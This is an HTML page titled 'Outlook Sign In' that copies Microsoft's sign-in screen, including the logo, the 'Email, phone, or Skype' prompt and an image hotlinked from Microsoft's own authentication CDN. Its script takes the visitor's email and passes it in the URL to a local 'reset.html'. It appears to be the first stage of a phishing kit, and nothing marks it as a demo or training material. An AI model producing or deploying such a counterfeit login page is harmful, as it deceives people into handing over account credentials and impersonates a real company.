<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Outlook Sign In</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        /* Add this new style for error message */
        .error-message {
            color: #d93025;
            font-size: 12px;
            margin-top: 4px;
            display: none;
        }
        
        /* Keep all your existing styles here */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: #ffffff;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .main-container {
            display: flex;
            flex-direction: column;
            gap: 20px;
            max-width: 440px;
            width: 100%;
        }
        
        .brand-header {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 16px;
        }
        
        .brand-logo {
            width: 30px;
            height: 30px;
        }
        
        .brand-name {
            font-size: 20px;
            font-weight: 600;
            color: grey;
        }
        
        .container {
            width: 100%;
            background: white;
            border-radius: 0px;
            box-shadow: 0 12px 28px rgba(0, 0, 0, 0.3);
        }
        
        .content {
            padding: 32px;
        }
        
        .signin-title {
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 0px;
            color: #1a1a1a;
        }
        
        .input-group {
            margin-bottom: 0px;
        }
        
        .input-group input {
            width: 100%;
            padding: 8px 0;
            border: none;
            border-bottom: 1px solid #ccc;
            border-radius: 0;
            font-size: 15px;
            transition: all 0.2s ease;
            background: transparent;
        }
        
        .input-group input:focus {
            outline: none;
            border-bottom-color: #0078d4;
        }
        
        .links a {
            font-size: 12px;
            line-height: 3;
            text-decoration: none;
            color: #0078d4;
        }
        
        .links text {
            font-size: 12px;
        }
        
        .buttons {
            display: flex;
            justify-content: flex-end;
            margin-top: 32px;
            gap: 12px;
        }
        
        .btn {
            padding: 8px 40px;
            border-radius: 0px;
            font-size: 14px;
            cursor: pointer;
            transition: all 0.2s ease;
            border: 1px solid transparent;
            min-width: 100px;
        }
        
        .btn-back {
            background: #e5e5e5;
            color: #333;
            border: 1px solid #c6c6c6;
            font-weight: 400;
        }
        
        .btn-back:hover {
            background: #d4d4d4;
            border-color: #b0b0b0;
        }
        
        .btn-next {
            background: #0078d4;
            color: white;
            font-weight: 600;
        }
        
        .btn-next:hover {
            background: #106ebe;
        }
        
        .signin-options {
            padding: 16px 32px;
            background: #f8f8f8;
            border-top: 1px solid #e5e5e5;
            display: flex;
            align-items: center;
            gap: 12px;
        }
        
        .signin-options h3 {
            font-size: 16px;
            color: #1a1a1a;
            font-weight: 350;
            margin: 0;
        }
        
        .trademark-notice {
            font-size: 10px;
            color: #666;
            text-align: center;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="main-container">
        <div class="container">
            <div class="content">
                <form id="emailForm" onsubmit="return validateAndSend()">
                    <div class="brand-header">
                        <img class="brand-logo" src="https://img.icons8.com/fluency/48/microsoft.png" alt="Microsoft logo">
                        <span class="brand-name">Microsoft</span>
                    </div>
                    
                    <h2 class="signin-title">Sign in</h2>
                    <br>

                    <div class="input-group">
                        <input type="text" id="email" placeholder="Email, phone, or Skype" required>
                        <div class="error-message" id="email-error">Please enter a valid email address</div>
                    </div>
                    <br>
                    <div class="links">
                        <text>No account? </text><a href="#">Create one!</a><br>
                        <a href="#">Can't access your account?</a>
                    </div>

                    <div class="buttons">
                        <button type="button" class="btn btn-back">Back</button>
                        <button type="submit" class="btn btn-next">Next</button>
                    </div>
                </form>
            </div>
        </div>
        
        <div class="container">
            <div class="signin-options">
                <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg" alt="Sign-in options">
                <h3>Sign-in options</h3>
            </div>
        </div>
    </div>

    <script>
        function validateEmail(email) {
            return email.includes('@') && 
                   email.split('@')[1].includes('.') && 
                   email.indexOf('@') > 0 && 
                   email.lastIndexOf('.') > email.indexOf('@') + 1;
        }

        function validateAndSend() {
            const email = document.getElementById('email').value.trim();
            const errorElement = document.getElementById('email-error');
            
            if (!validateEmail(email)) {
                errorElement.style.display = 'block';
                document.getElementById('email').focus();
                return false; // Prevent form submission
            }
            
            errorElement.style.display = 'none';
            window.location.href = `reset.html?data=${encodeURIComponent(email)}`;
            return false; // We're handling navigation manually
        }

        document.querySelector('.btn-back').addEventListener('click', function() {
            window.history.back();
        });

        // Handle Enter key in email field
        document.getElementById('email').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                validateAndSend();
            }
        });
    </script>
</body>
</html>
